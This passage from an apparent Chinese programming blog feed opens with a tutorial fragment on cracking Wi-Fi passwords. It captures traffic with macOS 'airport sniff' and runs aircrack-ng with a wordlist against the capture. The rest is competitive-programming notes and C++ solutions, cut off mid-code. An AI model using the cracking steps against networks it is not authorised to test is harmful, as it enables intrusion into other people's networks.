</thead>
<tbody>
<tr class="odd">
<td>小米手机</td>
<td>22:47:da:62:2a:f0</td>
<td>-29</td>
<td>6</td>
<td>Y</td>
<td>--</td>
<td>WPA2(PSK/AES/AES)</td>
</tr>
</tbody>
</table>
<ul>
<li>SSID 表示 Wi-Fi 名称</li>
<li>BSSID 表示 Wi-Fi 设备的硬件地址</li>
<li>RSSI 表示信号强度，值是负数，绝对值越小信号越强</li>
<li>CHANNEL 表示 Wi-Fi 信道</li>
<li>HT 表示吞吐量模式，一般都为 Y</li>
<li>CC 表示国家，中国为 CN</li>
<li>SECURITY 表示加密方式</li>
</ul>
<h3 id="使用-airport-进行抓包">3. 使用 airport 进行抓包</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff</span><br></pre></td></tr></table></figure>
<p>抓一段儿事件之后，使用 Ctrl + C 停止抓包，完成后会生成一个 cap
包，看到如下提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session saved to /tmp/airportSniff0RjCAO.cap.</span><br></pre></td></tr></table></figure>
<h3 id="安装-aircrack-ng">4. 安装 <a
href="https://aircrack-ng.org/">aircrack-ng</a></h3>
<ul>
<li>使用 <a href="https://brew.sh/">Homebrew</a> 安装：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">brew install aircrack-ng</span><br></pre></td></tr></table></figure>
<h3 id="使用-aircrack-ng-执行破解">5. 使用 aircrack-ng 执行破解</h3>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">aircrack-ng -w common.txt /tmp/airportSniff0RjCAO.cap</span><br></pre></td></tr></table></figure>
<h3 id="windows">Windows</h3>
<ul>
<li><p><a href="https://aircrack-ng.org/downloads.html">下载
Aircrack-ng</a> 提供了 Windows 的二进制包</p></li>
<li><p>使用 <a
href="https://docs.microsoft.com/en-us/windows/wsl/about">WSL</a></p></li>
</ul>
<h3 id="更多安装方式参考安装-aircrack-ng">更多安装方式参考：<a
href="https://aircrack-ng.org/install.html">安装 Aircrack-ng</a></h3>
<h1 id="命令行连接wifi">命令行连接wifi</h1>
<p><a
href="https://blog.csdn.net/kdongyi/article/details/84557708">参考</a></p>
]]></content>
      <tags>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title>区间元素取模、根号等操作</title>
    <url>/2025/02/22/%E5%8C%BA%E9%97%B4%E5%85%83%E7%B4%A0%E5%8F%96%E6%A8%A1%E3%80%81%E6%A0%B9%E5%8F%B7%E7%AD%89%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<ol type="1">
<li>整数取模一定是有限次操作</li>
</ol>
<p>因为<span class="math inline">\(a % b = c\)</span>， 当a &gt;
b时有<span class="math inline">\(b &gt; c\)</span>故 <span
class="math display">\[
a = kb + c &gt; (k + 1)c
\]</span> 于是有 a &gt; 2c, 即<span class="math inline">\(a &gt;
b\)</span>时，取模使数字大小会减半</p>
<p>故取模可以使数字变化有限次。</p>
<ol start="2" type="1">
<li>整数开方后向下取整一定是有限次操作</li>
</ol>
<p>开方后向下取整一定可以使数字变化有限次，因为所有数字开放后都会变小，最后变为1，
<span class="math inline">\(a^{2^k}\)</span>可以开k次方。</p>
]]></content>
  </entry>
  <entry>
    <title>区间标记需要注意的点</title>
    <url>/2025/02/22/%E5%8C%BA%E9%97%B4%E6%A0%87%E8%AE%B0%E9%9C%80%E8%A6%81%E6%B3%A8%E6%84%8F%E7%9A%84%E7%82%B9/</url>
    <content><![CDATA[<p>区间标记flag 请注意，不要使用flag =
-1表示子区间存在污点，这样会导致性能下降。直接将flag处做的修改同步到统计值上即可</p>
]]></content>
      <tags>
        <tag>数据结构</tag>
        <tag>线段树</tag>
      </tags>
  </entry>
  <entry>
    <title>区间积</title>
    <url>/2025/02/27/%E5%8C%BA%E9%97%B4%E7%A7%AF/</url>
    <content><![CDATA[<h1 id="题意">题意</h1>
<p>给你一组数<span
class="math inline">\(a_{1}......a_{n}\)</span>，给任意<span
class="math inline">\(r,l\)</span>，求解<span
class="math inline">\((\prod_{i = l}^{r}a_{i})mod\ k\)</span></p>
<h1 id="讨论">讨论</h1>
<p>如果使用前缀积来处理</p>
<p>这里讨论两种情况</p>
<ol type="1">
<li>k为质数</li>
<li>k为合数</li>
</ol>
<h2 id="k为质数">1. k为质数</h2>
<p>因为k为质数，所以k只有</p>
]]></content>
      <tags>
        <tag>数论</tag>
      </tags>
  </entry>
  <entry>
    <title>斐波那契数列性质</title>
    <url>/2025/02/22/%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E6%80%A7%E8%B4%A8/</url>
    <content><![CDATA[<h2 id="斐波那契数列求和">斐波那契数列求和</h2>
<p><span class="math display">\[
S_{n} = \sum_{i = 1}^{n}f_{i} = f_{n + 2} - f_{1}
\]</span></p>
<h2 id="斐波那契数列拆解">斐波那契数列拆解</h2>
<p><span class="math display">\[
f_{i} = f_{k + 1}f_{i - k} + f_{k}f_{i - k - 1}
\]</span></p>
<p>证明：</p>
<p><span class="math inline">\(f_{1} = f_{2} = 1\)</span>, 于是<span
class="math inline">\(f_{i} = f_{2}f_{i - 1} + f_{1}f_{i -
2}\)</span>,</p>
<p>此时分解<span class="math inline">\(f_{i - 1}\)</span>可得到， <span
class="math inline">\(f_{i} = (f_{2} + f_{1})f_{i - 2} + f_{2}f_{i -
3}\)</span></p>
<p>逐步分解即可得到上述拆解公式</p>
<p>应用： https://www.luogu.com.cn/problem/CF446C</p>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>st表</title>
    <url>/2025/02/27/st%E8%A1%A8/</url>
    <content><![CDATA[<h2 id="引用oiwiki上的结论">引用oiwiki上的结论</h2>
<p>st表用于解决“可重复贡献的区间问题”。就是说，在计算一个区间的属性时，可以利用多个相交的区间各自结果级逆行计算。比如，计算数组<span
class="math inline">\(a_{1},a_{2}...a_{10}\)</span>的最大值，可以转换为<span
class="math inline">\(max([1,6],[5,10])\)</span>，但是计算数组<span
class="math inline">\(\sum_{i =
1}^{10}a_{i}\)</span>这种区间和时，参与计算的两个区间不可相交。（区间gcd，以及rqm问题都是“可重复贡献的区间问题”）</p>
<p><a href="https://oi-wiki.org/ds/sparse-table/">参考文献</a></p>
]]></content>
      <tags>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>牛客小白94E小苯的01背包</title>
    <url>/2025/02/22/%E7%89%9B%E5%AE%A2%E5%B0%8F%E7%99%BD94E%E5%B0%8F%E8%8B%AF%E7%9A%8401%E8%83%8C%E5%8C%85/</url>
    <content><![CDATA[<h1 id="题目"><a
href="https://ac.nowcoder.com/acm/contest/82957/E">题目</a></h1>
<p>有n个物品，体积为v，价值为w，背包体积为k。物品叠加后体积和价值均为所有物品的体积与价值的<code>&amp;</code>，问在不超过k体积的前提下，背包最多能装多大价值的物品。</p>
<p>输入描述:</p>
<p>输入包含 n+1 行。 第一行两个正整数 <span class="math inline">\(n,k
(1≤n≤2×10^3,0≤k≤2×10^3)\)</span>分别表示物品个数和背包容量。 加下来 n
行，每行两个正整数 <span class="math inline">\(v_i\)</span>，<span
class="math inline">\(w_i\)</span> <span
class="math inline">\((0≤v_i,w_i≤2×10^3)\)</span>，表示每个物品的体积和价值。</p>
<p>输出描述:</p>
<p>输出包含一行一个整数，表示能装的最大价值。</p>
<h1 id="题解">题解</h1>
<p>因为<span
class="math inline">\(a\&amp;b\)</span>的值并不会因为a与b越大而越大，
<span class="math inline">\(x \&amp; y=z\)</span> 中<span
class="math inline">\(dp[z]\)</span>表示容量为z时最大重量的取值与<span
class="math inline">\(dp[x]\)</span>和<span
class="math inline">\(dp[y]\)</span>无关，因为<span
class="math inline">\(dp[x]\)</span>与<span
class="math inline">\(dp[y]\)</span>相与可能为0。即<span
class="math inline">\(dp\)</span>不满足最优子结构性质，所以不能使用<span
class="math inline">\(dp\)</span>。</p>
<p>由于答案范围比较小，可以通过枚举答案的方式查找答案。</p>
<p>当答案为重量W时，枚举所有物品重量<span class="math inline">\(w_{i}
\&amp; W ==
W\)</span>是否成立，在这些元素中计算组合后体积最小值即可。可知<span
class="math inline">\(a\&amp;
b&lt;b\)</span>，故将所有满足题意的元素选择即可获得最小的体积。此时检查体积最小是否满足题意即可。</p>
<p>代码如下： <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     E.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  19:41  2024.05.24</span></span><br><span class="line"><span class="comment">*   modify time:  19:41  2024.05.24</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> w[maxx],v[maxx];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,k;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="type">int</span> max_value = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">		max_value = <span class="built_in">max</span>(max_value,w[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = max_value;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="type">int</span> V = <span class="number">-1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((w[j] &amp; i) == i)V &amp;= v[j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(V != <span class="number">-1</span> &amp;&amp; V &lt;= k)&#123;</span><br><span class="line">			cout&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;<span class="number">0</span>&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>上述代码可以在E题中通过，时间复杂度为为<span
class="math inline">\(O(n^{2})\)</span></p>
<h1 id="如何通过f题">如何通过F题</h1>
<p>F中<span class="math inline">\(n,k (1≤n≤2×10^5,0≤k≤10^9) , v_i,w_i
(0≤v_i,w_i≤109)\)</span></p>
<p>假设W为答案，那么比W大的值不可能被程序选中，否则答案会发生变更。但比W小的值可能会通过选择作为答案。比如将W中的某一位从1变为0，使用下面程序依旧能被选择到。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = max_value;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">	<span class="type">int</span> V = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">		<span class="keyword">if</span>((w[j] &amp; i) == i)V &amp;= v[j];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(V != <span class="number">-1</span> &amp;&amp; V &lt;= k)&#123;</span><br><span class="line">           ans = <span class="built_in">max</span>(ans,i);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用这个特点可以使用位枚举，这也是位运算问题中常用的方法，答案不会超过32位，先枚举最高位，假设为1，如果这个值不成立，说明答案比这个值小，这个位应该为0，枚举下一位。类似于二分的思想，得到最终答案。代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2024 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     E.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  19:41  2024.05.24</span></span><br><span class="line"><span class="comment">*   modify time:  19:41  2024.05.24</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod2 = <span class="number">998244353</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = <span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> w[maxx],v[maxx];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,k;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; n;i++)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;v[i],&amp;w[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">31</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="type">int</span> V = <span class="number">-1</span>;</span><br><span class="line">		ans += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt; n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((w[j] &amp; ans) == ans)V &amp;= v[j];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(V == <span class="number">-1</span> || V &gt; k)&#123;</span><br><span class="line">			ans -= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>acm</tag>
        <tag>nowcoder</tag>
      </tags>
  </entry>
  <entry>
    <title>树形背包</title>
    <url>/2025/02/22/%E6%A0%91%E5%BD%A2%E8%83%8C%E5%8C%85/</url>
    <content><![CDATA[
]]></content>
      <tags>
        <tag>dp</tag>
        <tag>背包</tag>
      </tags>
  </entry>
  <entry>
    <title>网络流</title>
    <url>/2024/03/01/%E7%BD%91%E7%BB%9C%E6%B5%81/</url>
    <content><![CDATA[<h1 id="dinic">dinic</h1>
<p><a href="https://zhuanlan.zhihu.com/p/122375531">参考资料，</a></p>
<h2 id="当前弧优化">当前弧优化</h2>
<p><a
href="https://blog.csdn.net/Floatiy/article/details/80961870">什么是当前弧优化,</a>每次增广一条路后可以看做“榨干”了这条路，既然榨干了就没有再增广的可能了。但如果每次都扫描这些“枯萎的”边是很浪费时间的。那我们就记录一下“榨取”到那条边了，然后下一次直接从这条边开始增广，就可以节省大量的时间。这就是
当前弧优化 。</p>
<h2 id="最大流最小割">最大流最小割</h2>
]]></content>
      <tags>
        <tag>网络流</tag>
        <tag>未完成</tag>
      </tags>
  </entry>
  <entry>
    <title>那些神的记录</title>
    <url>/2025/02/27/%E9%82%A3%E4%BA%9B%E7%A5%9E%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><a href="https://www.zhihu.com/question/312070443">邓明杨</a></p>
<ol type="1">
<li>目的明确</li>
<li>投入大量时间！！！</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>莫比乌斯反演公式</title>
    <url>/2025/02/22/%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="参考">参考</h1>
<p><a href="https://zhuanlan.zhihu.com/p/107369246"></a></p>
<h1 id="什么是莫比乌斯反演">什么是莫比乌斯反演</h1>
<p>介绍莫比乌斯反演之前，需要了解莫比乌斯函数<span
class="math inline">\(\mu(n)\)</span>的定义。</p>
<h2 id="莫比乌斯函数">莫比乌斯函数</h2>
<p><span class="math display">\[
\mu(n) = {}
\]</span></p>
<h2 id="莫比乌斯反演公式如下">莫比乌斯反演公式如下</h2>
<p>若<span class="math inline">\(f(n) =
\sum_{d|n}g(\frac{n}{d})\)</span>，则<span class="math inline">\(g(n) =
\sum_{d|n} \mu(d)
f(\frac{n}{d})\)</span>。反之亦然，既两个条件为充要条件。</p>
]]></content>
      <tags>
        <tag>数学</tag>
      </tags>
  </entry>
  <entry>
    <title>dp计数状态的确定</title>
    <url>/2025/02/28/dp%E7%8A%B6%E6%80%81%E7%9A%84%E7%A1%AE%E5%AE%9A/</url>
    <content><![CDATA[<h1 id="计数问题">计数问题</h1>
<p>计算计数问题有多种方案,一种是直接使用数学表达式,另一种是使用dp,
数学表达式直接通过推到即可得出,本文主要讨论dp情况.</p>
<p>多个dp状态不可对应于某一个计数状态.这样会导致计数数量较多,
我们看一个例子</p>
<h2 id="题意">题意</h2>
<p>给n男m女,问有多少种排列方法,使得排列后任取一段排列其中的男女数量差不会超过k,
其中<span class="math inline">\(n,m &lt; 150, k &lt; 20\)</span></p>
<h2 id="题解">题解</h2>
<p>如果使用计数方法似乎不太容易,
无论正向思考还是反向思考似乎都无法得到正确答案.</p>
<p>考虑dp方法,题目中要求计算<code>任意一段区间</code>情况,
这种情况可以考虑状态中存在<code>最后一个位置的情况</code>以及<code>当前序列长度</code>,
通过枚举最后一个位置的情况,计算以最后一个位置为右端点的所有区间,
计算完所有序列长度后,即可得满足<code>任意一段区间</code>的相关性质.</p>
<h3 id="一个错误的接法">一个错误的接法</h3>
<p>如果已知<code>当前序列使用男生x,女生y</code>和<code>后缀最的男女差值i</code>,以及最大差值是<code>男多还是女多j</code>,那么dp转移方程如下:</p>
<p><span class="math display">\[
dp[x][y][i][j] = dp[x][y - 1][i - 1][j] + dp[x - 1][y][i][j]
\]</span></p>
<p>当然还需要考虑<span class="math inline">\(i ==
0\)</span>时是通过<span class="math inline">\(j = 0\)</span>还是<span
class="math inline">\(j ==
1\)</span>变化得来(男女数量均衡是通过男多于女还是女多余男的情况变化过来)</p>
<p>先说下这个中情况的错误之处,原因是一种情况可能会在两个dp中被计数,例如序列<code>nnvnv</code>,
在<span class="math inline">\(dp[3][2][1][0]\)</span>和<span
class="math inline">\(dp[3][2][1][1]\)</span>各被记录一次,会导致最终答案数量不正确.</p>
<h3 id="正解">正解</h3>
<p>正解就是在错解上改正,上面说到只记录<code>男生多于女生最大值和</code>和<code>女生多余男生最大值</code>无法准确描述一个状态,所以我们在状态中将两个最大值均记录下来,
注意这个最大值不会小于0,
因为一个后缀里没有元素时差值为0,所以两者插值最大值最小为0,不会出现负数.</p>
<p>$$</p>
<p>dp[i + 1][j][x + 1][max(0,y - 1)] += dp[i][j][x][y]; // 新增一个男生
dp[i][j + 1][max(x - 1, 0)][y + 1] += dp[i][j][x][y]; // 新增一个女生,
注意使用max函数的原因,因为无论(男 - 女)还是(女 -
男),最后一个位置他们的值都是0,所以这个差值最大值不可能为负数 $$</p>
<p>注意,有时增加一个女生并不会导致男 -
女的数量发生变化,因为女生数量太多只能导致区间长度非0时男 -
女差值为负数,(请在此处进行补充)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*================================================================</span></span><br><span class="line"><span class="comment">*   Copyright (C) 2025 Wang XinPeng. All rights reserved.</span></span><br><span class="line"><span class="comment">*   </span></span><br><span class="line"><span class="comment">*   filename:     p2592.cpp</span></span><br><span class="line"><span class="comment">*   username:     skt1faker</span></span><br><span class="line"><span class="comment">*   create time:  13:30  2025.02.23</span></span><br><span class="line"><span class="comment">*   modify time:  13:30  2025.02.23</span></span><br><span class="line"><span class="comment">*   email:        skk1faker@163.com</span></span><br><span class="line"><span class="comment">*   descripe:     </span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">================================================================*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> lll __int128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEBUG0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L(x) (x &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R(x) (L(x) + 1)</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod1 = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod = <span class="number">12345678</span>; </span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxn = <span class="number">150</span> + <span class="number">10</span>;</span><br><span class="line"><span class="comment">//int dp[maxn][maxn][30][2];	// 男,女,,0 -- 男女, 1 -- 女男		//此状态不可行,因为一个序列状态可能在多个dp中,例如序列(男), 在dp[1][0][1][0] = 1, dp[1][0][0][1] = 1,这样显然不可行,显然需要将两个状态放在一起.</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dp[maxn][maxn][<span class="number">30</span>][<span class="number">30</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> n,m,k;</span><br><span class="line">	cin&gt;&gt;n&gt;&gt;m&gt;&gt;k;</span><br><span class="line">	<span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">	dp[<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt;= n;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>;j &lt;= m;j++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>;x &lt;= k;x++)&#123;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>;y &lt;= k;y++)&#123;</span><br><span class="line">					<span class="comment">//dp[i][j][x][y] = dp[i][j - 1][x + 1][y - 1] + dp[i - 1][j][x - 1][0];</span></span><br><span class="line">					dp[i + <span class="number">1</span>][j][x + <span class="number">1</span>][<span class="built_in">max</span>(<span class="number">0</span>,y - <span class="number">1</span>)] += dp[i][j][x][y];	<span class="comment">// 新增一个男生</span></span><br><span class="line">					dp[i][j + <span class="number">1</span>][<span class="built_in">max</span>(x - <span class="number">1</span>, <span class="number">0</span>)][y + <span class="number">1</span>] += dp[i][j][x][y]; 	<span class="comment">// 新增一个女生, 注意使用max函数的原因,因为无论(男 - 女)还是(女 - 男),最后一个位置他们的值都是0,所以这个差值最大值不可能为负数</span></span><br><span class="line">					dp[i + <span class="number">1</span>][j][x + <span class="number">1</span>][<span class="built_in">max</span>(<span class="number">0</span>,y - <span class="number">1</span>)] %= mod;	<span class="comment">// 新增一个男生</span></span><br><span class="line">					dp[i][j + <span class="number">1</span>][<span class="built_in">max</span>(x - <span class="number">1</span>, <span class="number">0</span>)][y + <span class="number">1</span>] %= mod ; 	<span class="comment">// 新增一个女生</span></span><br><span class="line">					<span class="comment">//cout&lt;&lt;dp[i][j][x][y]&lt;&lt;endl;</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="comment">//printf(&quot;dp[%d][%d][%d] ==&gt; %d,%d\n&quot;,i,j,x,dp[i][j][x][0], dp[i][j][x][1]);</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> x = <span class="number">0</span>;x &lt;= k; x++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> y = <span class="number">0</span>;y &lt;= k;y++)&#123;</span><br><span class="line">			ans = (ans+ dp[n][m][x][y]) % mod;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>dp</tag>
      </tags>
  </entry>
  <entry>
    <title>Kevin逛超市2</title>
    <url>/2023/12/08/Kevin%E9%80%9B%E8%B6%85%E5%B8%822/</url>
    <content><![CDATA[<p>链接：https://ac.nowcoder.com/acm/contest/70845/D 来源：牛客网</p>
<h1 id="题意">题意：</h1>
<p>现有两种券，一种是折扣券，他可以将物品打折，如折扣券的折扣为x，物品i价格为p[i]，那么用折扣券购买时会将价钱变为<span
class="math inline">\(p[i] \times
x%\)</span>，还有一种券是立减券，立减券减少金额为y，商品使用立券购买后价格减少y，但商品价格最小为0。</p>
<p>现在有a张折扣券，b张立减劵，一个物品只能用一张券，现在有n个物品，买光所有物品时，问怎样使用才能将花费降到最低</p>
<h1 id="题解">题解</h1>
<p>可以明确的知道，无论那种券，价格越高的商品使用券会越合适（如果商品价格太小，那么立减券可能无法发挥全部作用，折扣券必然是商品价格越大，减少金额越多），所以价格前(a+b)大的商品使用优惠券才能满足题意。</p>
<p>但是如何进行合适的分配呢。现考虑两个商品i,j，他们的价格为p[i],p[j]，如果i更适合使用折扣券，j更适合立减券，那么有如下表达式
<span class="math display">\[
\frac{p[i](100 - x)}{100} + min(y,p[j]) &gt; \frac{p[j](100 - x)}{100} +
min(y,p[j])
\]</span>
利用如上表达式，对价格前a+b大的商品进行排序，得到的序列会在进行合理分配后有如下特点。<br />
- 这些商品中使用折扣券的聚集在一起，使用立减券的积聚在一起<br />
- 但是分界点未知。</p>
<p>知道以上特点，我们可以讨论下分界点，假设排序完之后使用折扣券的在序列前面，使用立减券的在序列后面，那么当<br />
- a + b &lt;= n<br />
这种情况直接前a个就是折扣券，后b个是立减券<br />
- a + b &gt; n<br />
这种情况使用多少a，多少b是未知的，所以需要暴力确定分界点，先假设使用券的情况为尽量将折扣券用完(可能用不完)，此时立减券还剩很多，然后逐步将一些折扣券替换为立减券，在替换过程中寻找花费最小的情况。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ll long long</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxx = (<span class="type">int</span>)<span class="number">2e5</span> + <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> x,y;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">pact</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> val,has_used;</span><br><span class="line"></span><br><span class="line">&#125;p[maxx];</span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">cmp1</span><span class="params">(pact v1,pact v2)</span>      <span class="comment">// 此函数返回真时，元素v1在前放，当前判断中v1使用折扣券合适时为真，所以最后序列中前半部分使用折扣券。</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="number">100</span> - x) * v<span class="number">1.</span>val + <span class="built_in">min</span>(v<span class="number">2.</span>val ,y) * <span class="number">100</span> &gt; (<span class="number">100</span> - x) * v<span class="number">2.</span>val + <span 